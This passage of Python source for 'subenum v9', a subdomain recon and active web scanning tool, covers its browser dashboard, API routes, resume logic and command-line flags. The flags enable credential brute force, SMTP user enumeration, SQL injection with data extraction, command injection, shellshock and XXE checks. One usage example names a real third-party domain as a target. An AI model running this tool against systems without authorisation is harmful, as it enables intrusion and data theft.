        <a class="ghost" href="/api/export?fmt=csv" download>&#8681; CSV</a>
        <a class="ghost" href="/api/export?fmt=json" download>&#8681; JSON</a>
        <button class="ghost" id="btnCopy">copy findings</button>
      </span>
    </div>
    <div class="tabs" id="tabs" role="tablist"></div>
    <div id="tabBody"></div>
  </section>

  <footer>subenum v9 &middot; local dashboard on 127.0.0.1 &middot; evidence-based findings only</footer>
</div>

<script>
const SE_TOKEN="__SE_TOKEN__";
"use strict";
const $=id=>document.getElementById(id);
const esc=s=>String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const SEVS=["critical","high","medium","low","info"];
const OPTS=[["brute","DNS brute"],["wayback","Wayback paths"],["ports","Port scan"],
  ["dirs","Dir busting"],["crawl","Crawler"],["secrets","Secret scan"],["params","Param fuzz"],
  ["nuclei","Nuclei templates"],["buckets","Cloud buckets"],["methods","HTTP methods"],
  ["api","API discovery"],["vhost","Vhost fuzz"],["cve","Surface CVE"],["tls","TLS config"],
  ["ws","WebSockets"],["smuggle","Smuggling"],["mine","Endpoint mining"],["files","Common files"],
  ["sweep","IP sweep"],["reverse","Reverse DNS"],["asn","ASN netblocks"],
  ["takeover","Takeover check"],["probe","HTTP probe"],["dns","DNS records"],
  ["axfr","Zone transfer"],["userenum","SMTP user enum"],["putdel","PUT/DELETE"],
  ["smtp","SMTP relay"],["mailsec","Mail security"],["nsecwalk","NSEC walk"]];
const st={state:null,stats:{sev:{}},results:null,profile:"full",cursor:0,runKey:null,
  rawlines:[],es:null,forcedLaunch:0};

$("opts").innerHTML=OPTS.map(([k,l])=>
  `<label class="opt"><input type="checkbox" checked data-k="${k}"> ${l}</label>`).join("");
document.querySelectorAll(".seg").forEach(el=>el.onclick=()=>{
  document.querySelectorAll(".seg").forEach(x=>x.classList.remove("on"));
  el.classList.add("on"); st.profile=el.dataset.p;
  if(st.profile==="quick"){
    const off=new Set(["brute","wayback","crawl","secrets","files","mine","dirs",
      "vhost","api","methods","params","tls","sweep","nuclei","buckets","ws",
      "smuggle","putdel","userenum","smtp","nsecwalk"]);
    $("opts").querySelectorAll("input").forEach(i=>i.checked=!off.has(i.dataset.k));
  }else{
    $("opts").querySelectorAll("input").forEach(i=>i.checked=true);
  }
});

function optsFromUI(){
  const o={};
  $("opts").querySelectorAll("input").forEach(i=>o[i.dataset.k]=i.checked);
  return o;
}
function colorLine(l){
  let e=esc(l);
  e=e.replace(/\[(critical|high|medium|low|info)\]/g,(m,s)=>`<b class="sv-${s}">${m}</b>`);
  e=e.replace(/(^|\s)\[!\]/g,(m)=>`${m.slice(0,-3)}<b class="er">[!]</b>`);
  e=e.replace(/^(\[\d+[a-z]?(?:-\d+)?\/19\].*)$/,'<b class="ph">$1</b>');
  return `<div class="ln${l.includes("[critical]")?" crit":""}">${e}</div>`;
}
let FIND="",JMPI=-1;
function renderConsole(){
  const box=$("console");
  const atEnd=box.scrollHeight-box.scrollTop-box.clientHeight<40;
  const show=st.rawlines.slice(-3000).filter(
    l=>!FIND||l.toLowerCase().includes(FIND));
  box.innerHTML=show.map(colorLine).join("");
  $("findN").textContent=FIND?(show.length?
    (Math.min(JMPI+1,show.length)+"/"+show.length):"0/0"):"";
  if(JMPI>=0&&show.length){
    const el=box.children[Math.min(JMPI,show.length-1)];
    if(el){el.classList.add("jmp");
      el.scrollIntoView({block:"center",behavior:"smooth"});}
  }
  if(atEnd)box.scrollTop=box.scrollHeight;
}
function clearConsole(){st.rawlines=[];$("console").innerHTML="";JMPI=-1;}
function jump(d){
  if(!FIND)return;
  const total=$("console").children.length;
  if(!total)return;
  JMPI=(JMPI+d+total)%total;
  renderConsole();
}
function addLog(lines){
  if(!lines||!lines.length)return;
  st.rawlines.push(...lines);
  if(st.rawlines.length>3000)
    st.rawlines.splice(0,st.rawlines.length-3000);
  renderConsole();
}
function renderPill(){
  const p=$("pill"),s=st.state||{};
  p.className="pill"+(s.running?" run":(s.done?" ok":""));
  $("pillTxt").textContent=s.running?("scanning"+(s.phase_tok?(" - "+s.phase_tok):"")):
    (s.done?("complete"+(s.exit===0?"":(" (exit "+s.exit+")"))):"idle");
  $("led").className="led"+(s.running?" g":"");
}
function renderPhases(){
  const s=st.state;if(!s||!s.phases)return;
  $("phases").innerHTML=s.phases.map((p,i)=>{
    const cls=i===s.phase_idx?"on":(i<s.phase_idx?"past":"");
    return `<span class="tok ${cls}">${p.tok} ${esc(p.name)}</span>`;
  }).join("");
  if(s.phase_idx>=0&&s.phases[s.phase_idx])
    $("phLabel").innerHTML=`phase <b>${s.phase_tok}</b> &mdash; ${esc(s.phase_name)}`;
  const pct=s.done?100:(s.progress||0);
  $("fill").style.width=pct+"%";
  $("pct").textContent=Math.round(pct)+"%";
  $("tgtLine").textContent=s.targets||"";
  $("elapsed").textContent=(s.elapsed||0)+"s";
}
const STAT_DEF=[["subs","Subdomains"],["endpoints","Endpoints"],["ports","Open ports"],
  ["dirs","Dir hits"],["vhosts","Vhosts"],["findings","Findings"],
  ["errors","Check errors"]];
function renderStats(){
  const s=st.stats||{};
  $("stats").innerHTML=STAT_DEF.map(([k,l])=>
    `<div class="stat"><div class="n">${s[k]||0}</div><div class="l">${l}</div></div>`).join("");
  const sv=s.sev||{};
  $("sevchips").innerHTML=SEVS.map(x=>
    `<button class="chip s-${x}${SEVFLT===x?" on":""}" data-s="${x}" `+
    `aria-pressed="${SEVFLT===x}">${x} ${sv[x]||0}</button>`).join("")+
    (SEVFLT?`<button class="chip s-info" data-s="">show all</button>`:"");
  $("sevchips").querySelectorAll("button").forEach(b=>b.onclick=()=>{
    const s=b.dataset.s;
    SEVFLT=(s&&SEVFLT!==s)?s:null;
    if(s)TAB="findings";
    renderStats();
    if(st.results)renderResults(st.results);
  });
}
let TAB="findings",SEVFLT=null;
function renderResults(r){
  if(!r)return; st.results=r;
  const counts={findings:r.findings.length,subdomains:r.subdomains.length,
    ports:r.ports.length,dirs:r.dirs.length,vhosts:r.vhosts.length,
    surface:r.surface.length,downloads:0};
  const tabs=[["findings","Findings"],["subdomains","Subdomains"],["ports","Ports"],
    ["dirs","Dirs"],["vhosts","Vhosts"],["surface","Surface"],["downloads","Downloads"]];
  $("tabs").innerHTML=tabs.map(([k,l])=>
    `<button class="tab${k===TAB?" on":""}" data-k="${k}" role="tab" `+
    `aria-selected="${k===TAB}" aria-controls="tabBody">${l} ${counts[k]||""}</button>`).join("");
  $("tabs").querySelectorAll("button").forEach(b=>b.onclick=()=>{TAB=b.dataset.k;renderResults(st.results);});
  const body=$("tabBody");
  if(TAB==="findings"){
    let rows=r.findings;
    if(SEVFLT)rows=rows.filter(f=>f.sev===SEVFLT);
    body.innerHTML=rows.length?
      `<div class="tbl">`+rows.map((f,i)=>
        `<div class="tr frow" data-i="${i}"><span class="chip s-${f.sev}">${f.sev}</span><span class="ft">${esc(f.text)}</span></div>`
      ).join("")+`</div>`:
      `<div class="empty" role="status">${SEVFLT?"no "+SEVFLT+" findings":"no findings in the output files yet"}</div>`;
    if(rows.length)
      body.querySelectorAll(".frow").forEach(
        el=>el.onclick=()=>toggleEv(el,rows[+el.dataset.i]));
  }else if(TAB==="downloads"){
    const avail=Object.entries(r.available||{}).filter(([,v])=>v);
    body.innerHTML=avail.length?avail.map(([n])=>
      `<a class="dl" href="/files/${encodeURIComponent(n)}" target="_blank" rel="noopener">&#8681; ${esc(n)}</a>`
    ).join(""):`<div class="empty" role="status">no output files yet</div>`;
  }else{
    const arr=r[TAB]||[];
    body.innerHTML=arr.length?
      `<div class="list">`+arr.map(x=>`<div class="li">${esc(x)}</div>`).join("")+`</div>`:
      `<div class="empty" role="status">nothing here yet</div>`;
  }
  $("resMeta").textContent=Object.entries(r.available||{}).filter(([,v])=>v).length+
    " file(s) on disk";
}
function setView(){
  const s=st.state||{};
  if(st.forcedLaunch&&s.running)st.forcedLaunch=0; // scan began elsewhere
  const live=!st.forcedLaunch&&(s.running||(s.done&&(s.lines||0)>0));
  $("viewLaunch").hidden=!!live;
  $("viewLive").hidden=!live;
  $("btnNew").hidden=!(s.done&&!s.running);   // relaunch without a page reload
  $("resultsCard").hidden=!(s.done||s.running||(st.results&&st.results.findings.length));
}
function onState(s){
  if(s&&s.started){
    if(st.runKey===null)st.runKey=s.started;
    else if(s.started!==st.runKey){            // new run: wipe old console
      st.runKey=s.started;clearConsole();
    }
  }
  st.state=s;renderPill();renderPhases();setView();
}
function onStats(s){st.stats=s;renderStats();}
async function fetchResults(){
  try{const r=await(await fetch("/api/results")).json();renderResults(r);}catch(e){}
}
function findUrl(t){
  const m=t.match(/https?:\/\/[^\s"'<>]+/);
  if(m)return m[0].replace(/[.,;)]+$/,"");
  const h=t.match(/\b([a-z0-9][a-z0-9.-]*\.[a-z]{2,})(?::(\d{2,5}))?\b/i);
  return h?("http://"+h[1]+(h[2]?":"+h[2]:"")):null;
}
function toggleEv(el,f){
  const nx=el.nextElementSibling;
  if(nx&&nx.classList.contains("evbox")){nx.remove();return;}
  document.querySelectorAll(".evbox").forEach(x=>x.remove());
  const u=findUrl(f.text);
  const d=document.createElement("div");
  d.className="evbox";
  d.innerHTML=`<div class="evtag"><span class="chip s-${f.sev}">${f.sev}</span>`+
    `<code>${esc(f.tag||"UNKNOWN")}</code></div>`+
    `<div class="evrem"><b>Remediation:</b> ${esc(f.rem||"see the docs for this tag")}</div>`+
    `<div class="evproof"><b>Evidence:</b> ${esc(f.text)}</div>`+
    (u?`<button class="ghost" id="evLive" style="border-color:#17352b;color:#2f7d63">&#8635; verify live</button><pre class="evout" hidden></pre>`
      :`<div class="evproof" style="margin:0">no probeable URL in this finding</div>`);
  el.after(d);
  const b=d.querySelector("#evLive");
  if(b&&u)b.onclick=async()=>{
    b.disabled=true;b.textContent="probing…";
    const out=d.querySelector(".evout");
    try{
      const j=await(await fetch("/api/evidence?url="+encodeURIComponent(u),
        {headers:{"X-Subenum-Token":SE_TOKEN}})).json();
      out.hidden=false;
      if(!j.ok){out.textContent="error: "+(j.error||"failed");}
      else{
        const rh=Object.entries(j.request.headers).map(([k,v])=>k+": "+v).join("\n");
        const sh=Object.entries(j.response.headers).map(([k,v])=>k+": "+v).join("\n");
        out.textContent="> GET "+j.request.url+"\n"+rh+"\n\n< HTTP "+
          j.response.status+"\n"+sh+"\n\n"+j.response.body;
      }
    }catch(e){out.hidden=false;out.textContent="error: "+e;}
    b.disabled=false;b.innerHTML="&#8635; verify live";
  };
}
async function loadHistory(){
  try{
    const h=await(await fetch("/api/history")).json();
    const sc=h.scans||[];
    if(!sc.length){$("histCard").hidden=true;return;}
    $("histCard").hidden=false;
    $("histList").innerHTML=sc.map(s=>
      `<button class="histrow" data-i="${s.i}"><b>${esc(s.label)}</b>`+
      `<span>${new Date(s.ts*1000).toLocaleString()}</span>`+
      `<span>${s.findings} findings &middot; ${s.subs} subs &middot; `+
      `${s.exit===0?"ok":"exit "+s.exit} &middot; ${s.elapsed}s</span></button>`
    ).join("");
    $("histList").querySelectorAll("button").forEach(b=>b.onclick=async()=>{
      try{
        const snap=await(await fetch("/api/history?i="+b.dataset.i)).json();
        if(snap&&snap.results){
          renderResults(snap.results);
          $("resultsCard").hidden=false;
          $("resultsCard").scrollIntoView({behavior:"smooth"});
        }
      }catch(e){}
    });
  }catch(e){}
}
$("btnRefresh").onclick=()=>{fetchResults();};
$("btnClrHist").onclick=async()=>{
  if(!confirm("delete saved scan history and old result files?"))return;
  try{
    const j=await(await fetch("/api/clear",
      {method:"POST",headers:{"X-Subenum-Token":SE_TOKEN}})).json();
    if(!j.ok){alert(j.error||"clear failed");return;}
  }catch(e){return;}
  $("histCard").hidden=true;$("histList").innerHTML="";
};
$("btnClear").onclick=()=>{clearConsole();};
$("logFind").addEventListener("input",()=>{
  FIND=$("logFind").value.trim().toLowerCase();JMPI=-1;renderConsole();});
$("logFind").addEventListener("keydown",e=>{
  if(e.key==="Enter"){e.preventDefault();jump(1);}
  if(e.key==="Escape"){$("logFind").value="";FIND="";JMPI=-1;renderConsole();}
});
$("findNext").onclick=()=>jump(1);
$("findPrev").onclick=()=>jump(-1);
$("btnCopy").onclick=async()=>{
  const r=st.results;if(!r||!r.findings.length)return;
  try{
    await navigator.clipboard.writeText(r.findings.map(f=>f.text).join("\n"));
    $("btnCopy").textContent="copied";
    setTimeout(()=>{$("btnCopy").textContent="copy findings";},1300);
  }catch(e){}
};
$("targets").addEventListener("keydown",e=>{
  if(e.key==="Enter"){e.preventDefault();$("btnStart").click();}
});
$("btnNew").onclick=()=>{st.forcedLaunch=1;setView();
  window.scrollTo({top:0,behavior:"smooth"});};
$("btnStart").onclick=async()=>{
  const t=$("targets").value.trim();
  $("err").textContent="";
  if(!t){$("err").textContent="enter at least one target";return;}
  st.forcedLaunch=0;
  $("btnStart").disabled=true;
  const lines=id=>($(id).value||"").split(/[\r\n]+/).map(s=>s.trim()).filter(Boolean);
  const creds=lines("#credPairs").map(s=>s.includes(":")?s:(":"+s));
  const bruteU=lines("#bruteU");
  const bruteP=lines("#bruteP");
  const num=id=>{const v=parseInt($(id).value,10);return Number.isFinite(v)?v:0;};
  try{
    const res=await fetch("/api/start",{method:"POST",
      headers:{"Content-Type":"application/json","X-Subenum-Token":SE_TOKEN},
      body:JSON.stringify({targets:t,opts:optsFromUI(),profile:st.profile,
        authorization:$("authz").value.trim(),cookie:$("ck").value.trim(),
        creds:creds,brute_users:bruteU,brute_passes:bruteP,
        proxy:$("proxy").value.trim(),auth_b:$("authB").value.trim(),
        resume:$("optResume").checked,sarif:$("optSarif").checked,
        junit:$("optJunit").checked,fail_on:$("failOn").value,
        nuclei_sev:$("nucleiSev").value.trim(),
        dns_conc:num("dnsConc"),http_conc:num("httpConc"),
        port_conc:num("portConc")})});
    const j=await res.json();
    if(!res.ok||!j.ok){$("err").textContent=j.error||"start failed";}
    else{$("console").innerHTML="";st.rawlines=[];st.cursor=0;st.runKey=j.state.started;
      st.results=null;fetchResults();onState(j.state);}
  }catch(e){$("err").textContent="server unreachable: "+e;}
  $("btnStart").disabled=false;
};

function connect(){
  let poll=null;
  try{
    const es=new EventSource("/events"); st.es=es;
    es.onmessage=ev=>{
      let j;try{j=JSON.parse(ev.data);}catch(e){return;}
      if(j.t==="snapshot"){
        onState(j.state);                      // may wipe console (new run)
        const fresh=(j.log||[]).filter(x=>x&&x.n>st.cursor);
        if(fresh.length){
          st.cursor=Math.max(st.cursor,fresh[fresh.length-1].n);
          addLog(fresh.map(x=>x.text));        // only unseen lines (no dupes
                                               // after an SSE reconnect)
        }
        onStats(j.stats);
      }else if(j.t==="log"){
        addLog(j.lines);
        st.cursor=Math.max(st.cursor,j.n||0);  // advance past SSE-delivered
                                               // lines so the poll fallback
                                               // never re-renders them
      }
      else if(j.t==="state"){onState(j.state);}
      else if(j.t==="stats"){onStats(j.stats);}
    };
    es.onerror=()=>{};
  }catch(e){}
  let ticks=0;
  const tick=async()=>{
    ticks++;
    try{
      const j=await(await fetch("/api/log?since="+st.cursor)).json();
      const before=st.runKey;
      onState(j.state);                        // detects a new run first
      const changed=st.runKey!==before;
      st.cursor=j.n;
      if(!st.es||st.es.readyState===EventSource.CLOSED){
        if(!changed)addLog(j.lines);           // skip the batch that straddles
                                               // a run boundary (mixes old+new)
        onStats(j.stats);
      }
    }catch(e){}
    const s=st.state;
    if(s&&s.done&&s.exit!==null){
      fetchResults();                             // final results
      if(st.histSeen!==s.started){                // new run just finished:
        st.histSeen=s.started;loadHistory();      // refresh recent scans
      }
    }
    else if(s&&s.running&&ticks%4===0)fetchResults();    // live partial results
  };
  poll=setInterval(tick,1200);
  setInterval(()=>{if(st.state&&st.state.running)renderPhases();},1000);
}
async function boot(){
  try{
    const s=await(await fetch("/api/state")).json();
    st.runKey=s.started||null;
    onState(s);
    const lg=await(await fetch("/api/log?since=0")).json();
    st.cursor=lg.n;
    if(lg.lines.length){addLog(lg.lines);onStats(lg.stats);}
  }catch(e){}
  if(st.state&&(st.state.running||st.state.done))fetchResults();
  loadHistory();
  connect();
}
boot();
</script>
</body>
</html>
"""


_WEB_TOKEN = ""          # per-process session token for mutating /api routes


def build_webapp(runner=None):
    global _WEB_TOKEN
    _web_install_tee()
    _WEB_TOKEN = secrets.token_urlsafe(16)
    if runner is not None:
        WEB_BUS.runner = runner
    if WEB_BUS.runner is None:
        WEB_BUS.runner = _web_run_scan
    WEB_BUS.active = True

    @web.middleware
    async def _token_mw(request, handler):
        # side-effect routes need the per-process token: blocks cross-origin
        # CSRF (a random page can POST /api/clear or fire blind scans) while
        # same-origin UI fetches carry the token injected into index()
        if request.path in ("/api/start", "/api/clear", "/api/evidence"):
            if request.headers.get("X-Subenum-Token", "") != _WEB_TOKEN:
                return web.json_response(
                    {"ok": False,
                     "error": "missing/invalid session token"}, status=403)
        return await handler(request)

    app = web.Application(middlewares=[_token_mw])

    async def index(request):
        return web.Response(text=WEBUI_HTML.replace("__SE_TOKEN__", _WEB_TOKEN),
                            content_type="text/html")

    async def api_state(request):
        return web.json_response(_web_state())

    async def api_stats(request):
        return web.json_response(_web_stats())

    async def api_results(request):
        return web.json_response(_web_results())

    async def api_dl(request):
        name = request.match_info.get("name", "")
        if name not in WEB_FILES or not os.path.isfile(name):
            raise web.HTTPNotFound(text="file not found")
        return web.FileResponse(name)

    async def api_export(request):
        fmt = (request.query.get("fmt") or "csv").lower()
        res = _web_results()
        if fmt == "csv":
            return web.Response(
                text=findings_csv(res["findings"]),
                content_type="text/csv",
                headers={"Content-Disposition":
                         'attachment; filename="subenum_findings.csv"'})
        if fmt == "json":
            doc = {"exported": time.time(), "targets": WEB_BUS.targets}
            doc.update(res)
            return web.Response(
                text=json.dumps(doc, ensure_ascii=False, indent=2),
                content_type="application/json",
                headers={"Content-Disposition":
                         'attachment; filename="subenum.json"'})
        return web.json_response(
            {"ok": False, "error": "fmt must be csv or json"}, status=400)

    async def api_evidence(request):
        """on-demand proof: re-probe the URL behind a finding and show the
        raw request/response pair (http(s) only, capped, no redirects)."""
        url = (request.query.get("url") or "").strip()
        if not re.match(r"^https?://[^\s]+$", url, re.I):
            return web.json_response(
                {"ok": False, "error": "http(s) url required"}, status=400)
        try:
            timeout = aiohttp.ClientTimeout(total=8)
            async with aiohttp.ClientSession(timeout=timeout) as ev_s:
                async with ev_s.get(url, headers=dict(UA),
                                    allow_redirects=False, ssl=False) as r:
                    body = (await r.content.read(4096)).decode(
                        "utf-8", "replace")
                    return web.json_response({
                        "ok": True,
                        "request": {"method": "GET", "url": url,
                                    "headers": dict(r.request_info.headers)},
                        "response": {"status": r.status,
                                     "headers": dict(r.headers),
                                     "body": body}})
        except Exception as e:
            return web.json_response(
                {"ok": False, "error": str(e)[:200]}, status=502)

    async def api_history(request):
        snaps = _hist_read()
        if "i" in request.query:
            try:
                return web.json_response(snaps[int(request.query["i"])])
            except (ValueError, IndexError):
                return web.json_response(
                    {"ok": False, "error": "no such history entry"}, status=400)
        summ = []                                   # newest first
        for i in range(len(snaps) - 1, -1, -1):
            s, res = snaps[i], snaps[i].get("results") or {}
            summ.append({"i": i, "ts": s.get("ts", 0),
                         "label": s.get("targets", ""),
                         "exit": s.get("exit"), "elapsed": s.get("elapsed", 0),
                         "findings": len(res.get("findings") or []),
                         "subs": len(res.get("subdomains") or [])})
        return web.json_response({"scans": summ})

    async def api_clear(request):
        if WEB_BUS.running:
            return web.json_response(
                {"ok": False, "error": "a scan is running - stop it first"},
                status=409)
        n = _clear_old_data("subdomains")
        return web.json_response({"ok": True, "removed": n})

    app.router.add_get("/", index)
    app.router.add_get("/events", _web_events)
    app.router.add_get("/api/state", api_state)
    app.router.add_get("/api/stats", api_stats)
    app.router.add_get("/api/results", api_results)
    app.router.add_get("/api/log", _web_api_log)
    app.router.add_post("/api/start", _web_api_start)
    app.router.add_get("/api/export", api_export)
    app.router.add_get("/api/evidence", api_evidence)
    app.router.add_get("/api/history", api_history)
    app.router.add_post("/api/clear", api_clear)
    app.router.add_get("/files/{name}", api_dl)
    return app


async def run_webui(port, host="127.0.0.1", open_browser=True, fallback=False):
    # port 80 == literal http://subenum (hosts entry 127.0.0.1 subenum);
    # fallback walks 8080..8099 when the wanted default is taken (Burp and
    # dev servers squat 8080) - explicit --web PORT never falls back
    want = int(port)
    ports = [want] + ([p for p in range(8080, 8100) if p != want]
                      if fallback else [])
    url, bound, last = None, None, None
    for p in ports:
        try:
            app = build_webapp()
            runner = web.AppRunner(app, access_log=None)
            await runner.setup()
            await web.TCPSite(runner, host, p).start()
            bound = p
            url = f"http://{host}" if p == 80 else f"http://{host}:{p}"
            if p != want:
                _REAL_PRINT(f"[i] port {want} busy - dashboard moved to {p}",
                            flush=True)
            break
        except OSError as e:
            last = e
            continue
    if url is None:
        _REAL_PRINT(f"[!] web UI cannot bind {host}:{want} - {last}", flush=True)
        return
    _REAL_PRINT(f"[+] web UI: {url}   "
                f"(enter targets in the browser - Ctrl+C stops)", flush=True)
    alias = None
    try:
        import socket as _s
        _s.gethostbyname("subenum")              # hosts entry present?
        alias = "http://subenum" if bound == 80 else f"http://subenum:{bound}"
        _REAL_PRINT(f"[+] also reachable as {alias}", flush=True)
    except Exception:
        _REAL_PRINT("[i] tip: add  127.0.0.1 subenum  to your hosts file to "
                    "reach it as http://subenum", flush=True)
    if open_browser and sys.stdout.isatty():
        def _open():
            target = alias or url
            try:
                import webbrowser
                webbrowser.open(target)
            except Exception:
                pass
        import threading
        threading.Timer(0.8, _open).start()
    try:
        await asyncio.Event().wait()
    finally:
        pass


class Findings(list):
    """findings list that dedups on append. the scan runs ~25 check families
    across retries/wildcards that can push identical finding strings; dedup at
    insert keeps memory flat without touching the 240+ append call sites."""

    def append(self, item):
        if item not in self:
            super().append(item)

    def extend(self, items):
        for it in items:
            self.append(it)


def write_state(path, st):
    """atomic checkpoint write (tmp + os.replace) so Ctrl+C mid-save never
    truncates a resumable state file."""
    tmp = f"{path}.{os.getpid()}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(st, f)
        os.replace(tmp, path)
    except Exception as e:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        note_check_error("state", f"save failed: {e}")


def parse_state(st, domains):
    """resume ladder -> {start: n, key: value...} with conversions applied
    (sets/tuples/decoded probe bodies), or None when the checkpoint belongs
    to different targets. stage 3 -> start 4, stage 5 -> 6, stage 15 -> 16."""
    if st.get("targets") and set(st["targets"]) != set(domains):
        return None
    sg = int(st.get("stage", 0) or 0)
    if sg < 3:
        return {"start": 1}
    out = {"start": 4, "live": st.get("live", {}),
           "findings": st.get("findings", []),
           "apex": st.get("apex", {}),
           "brute_all": set(st.get("brute_all", [])),
           "evidence": set(st.get("evidence", [])),
           "wc_zones": st.get("wc_zones", {})}
    if sg >= 5:
        out.update(start=6, cname=st.get("cname", {}),
                   chains=st.get("chains", {}), dangling=st.get("dangling", {}),
                   surf=st.get("surf", {}),
                   netblocks=set(st.get("netblocks", [])),
                   certs=st.get("certs", {}))
        pr = {}
        for h, i in st.get("probes", {}).items():
            i = dict(i)
            b64 = i.pop("body64", "")
            i["body"] = base64.b64decode(b64) if b64 else b""
            pr[h] = i
        out["probes"] = pr
    if sg >= 15:
        out.update(start=16,
                   port_results=[tuple(r) for r in st.get("port_results", [])],
                   dir_rows=st.get("dir_rows", []),
                   vhost_rows=st.get("vhost_rows", []),
                   api_rows=st.get("api_rows", []),
                   method_rows=st.get("method_rows", []),
                   attrib={p: set(hs) for p, hs in st.get("attrib", {}).items()},
                   all_paths=set(st.get("all_paths", [])),
                   mined={h: set(ps) for h, ps in st.get("mined", {}).items()},
                   scripts_by_host={h: set(v) for h, v
                                    in st.get("scripts_by_host", {}).items()},
                   surfinfo=st.get("surfinfo")
                   or {"cdn": {}, "params": 0, "cves": [], "js": 0})
        out["crawl_rows"] = sorted(
            f"{h}\t{p}" for p, hs in out["attrib"].items() for h in hs)
    return out


def _env_int(k):
    try:
        return int(os.environ.get(k, "0") or 0)
    except ValueError:
        return 0


async def main():
    global a   # module-level handle: _system_resolvers() reads
               # globals()["a"] for --nameservers (nuclei -r list)
    # stdout may be a pipe/console in cp1252 - host titles carry utf-8
    # (Hindi, emoji); never crash on print, keep logs as utf-8
    for _stream in (sys.stdout, sys.stderr):
        try:
            _stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError, OSError):
            pass
    CHECK_ERRORS.clear()
    ap = argparse.ArgumentParser(
        add_help=True,
        description="subenum v9 - automated subdomain recon + active scanning "
                    "(19 phases). run with no arguments to open the browser "
                    "dashboard, or pipe a target: "
                    "echo example.com | python subenum.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  python subenum.py                      browser dashboard "
               "(auto-opens http://subenum, 8081+ if busy)\n"
               "  python subenum.py --cli                interactive console "
               "prompt, Enter=go\n"
               "  echo example.com | python subenum.py   scripted target on stdin\n"
               "  python subenum.py magicpin.in --nobrute --crawl 30\n"
               "  python subenum.py example.com --fail-on high --sarif --junit\n"
               "  python subenum.py app.com --cookie \"sid=abc\" --auth-b \"Cookie: sid=b\"\n"
               "  python subenum.py example.com --resume  continue an interrupted run\n"
               "  python subenum.py --web                browser dashboard (default "
               "port 80 = http://subenum)\n"
               "see the module docstring for the full flag list and profiles.")
    ap.add_argument("targets", nargs="*",
                    help="target domain(s); @file reads one per line")
    ap.add_argument("--targets", dest="targets_csv",
                    help="comma/space separated targets (same as positional)")
    ap.add_argument("--wl", action="append", default=[],
                    help="extra DNS brute wordlist path (repeatable)")
    ap.add_argument("--out", default="subdomains.txt",
                    help="primary output file; every other output derives from "
                         "its basename")
    ap.add_argument("--clear-data", action="store_true",
                    help="delete scan history + previous <out>* result "
                         "artifacts; exits right away unless targets are "
                         "given (then scans fresh)")
    ap.add_argument("--max", type=int, default=60000,
                    help="max subdomains kept after DNS brute")
    ap.add_argument("--nobrute", action="store_true",
                    help="skip DNS brute-force (phases 2-3)")
    ap.add_argument("--no-probe", dest="probe", action="store_false",
                    help="skip the HTTP probe - also disables crawl, discovery, "
                         "secrets, API, methods and phase 16")
    ap.add_argument("--no-dns", dest="dns", action="store_false",
                    help="skip phase 4 (CNAME/AXFR/TLS-cert harvest, dangling "
                         "detection) - also disables takeover + TLS-config findings")
    ap.add_argument("--no-wayback", dest="wayback", action="store_false",
                    help="skip Wayback Machine path/JS harvesting")
    ap.add_argument("--no-secrets", dest="secrets", action="store_false",
                    help="skip JS/secret scan (phase 9)")
    ap.add_argument("--no-ports", dest="portscan", action="store_false",
                    help="skip the port scan")
    ap.add_argument("--ports", default="", help="comma list, default 65 common ports")
    ap.add_argument("--no-takeover", dest="takeover", action="store_false",
                    help="skip dangling-CNAME takeover confirmation")
    ap.add_argument("--no-mine", dest="mine", action="store_false",
                    help="skip endpoint/param mining from crawled content "
                         "and sitemaps (drops mined query paths from the "
                         "attack surface)")
    ap.add_argument("--no-files", dest="files", action="store_false",
                    help="skip common-file leak checks (phase 9b)")
    ap.add_argument("--crawl", dest="crawl_n", type=int, default=20,
                    help="pages per host to crawl (0=off)")
    ap.add_argument("--no-crawl", dest="crawl_off", action="store_true",
                    help="skip the web crawler (same as --crawl 0)")
    ap.add_argument("--no-report", dest="noreport", action="store_true",
                    help="skip HTML/JSON report writing")
    ap.add_argument("--no-dirs", dest="dirs", action="store_false",
                    help="skip content discovery - dir busting (phase 11)")
    ap.add_argument("--dirwl", default="", help="extra content-discovery wordlist")
    ap.add_argument("--no-vhost", dest="vhost", action="store_false",
                    help="skip vhost brute force (phase 12)")
    ap.add_argument("--no-api", dest="api", action="store_false",
                    help="skip API endpoint/spec discovery (phase 13)")
    ap.add_argument("--no-methods", dest="methods", action="store_false",
                    help="skip HTTP method checks - OPTIONS/PUT/TRACE/... (phase 14)")
    ap.add_argument("--no-cve", dest="cve", action="store_false",
                    help="skip surface CVE matching against live services (phase 15)")
    ap.add_argument("--resume", action="store_true", help="continue from state file")
    ap.add_argument("--state", default="", help="state file path")
    ap.add_argument("--max-scan", type=int, default=300,
                    help="max hosts scanned in phase 9 (JS secrets + file leaks)")
    ap.add_argument("--resolver", choices=("auto", "doh", "system"), default="auto",
                    help="auto=doh first + system fallback, doh=DoH only, system=local DNS first")
    ap.add_argument("--nameservers", default="",
                    help="comma list of DNS servers for the system resolver")
    ap.add_argument("--no-axfr", dest="axfr", action="store_false",
                    help="skip zone-transfer attempts against apex NS")
    ap.add_argument("--keep-wildcard", dest="wildfilter", action="store_false",
                    help="keep brute hosts under wildcard DNS zones")
    ap.add_argument("--no-reverse", dest="reverse", action="store_false",
                    help="skip reverse-DNS / netblock expansion (phase 4b)")
    ap.add_argument("--ptr-budget", type=int, default=4000,
                    help="max PTR queries for /24 sweeps + netblock sampling "
                         "(0 = live-IP PTRs only)")
    ap.add_argument("--no-asn", dest="asn", action="store_false",
                    help="skip RIPEstat org-ASN netblock sampling")
    ap.add_argument("--dns-conc", type=int, default=0,
                    help="max concurrent DNS lookups (0 = keep default 300)")
    ap.add_argument("--http-conc", type=int, default=0,
                    help="max concurrent HTTP requests (0 = keep default 120)")
    ap.add_argument("--port-conc", type=int, default=0,
                    help="max concurrent port probes (0 = keep default 400)")
    ap.add_argument("--no-params", dest="params", action="store_false",
                    help="skip parameter attack checks (phase 16)")
    ap.add_argument("--attack-budget", type=int, default=1000,
                    help="max requests for parameter attacks (phase 16)")
    ap.add_argument("--no-sqli", dest="sqli", action="store_false",
                    help="skip SQL/NoSQL injection stages (error/boolean/time/"
                         "extraction) of phase 16")
    ap.add_argument("--no-cmdi", dest="cmdi", action="store_false",
                    help="skip OS command-injection / SSI / shellshock "
                         "stages of phase 16")
    ap.add_argument("--no-xxe", dest="xxe", action="store_false",
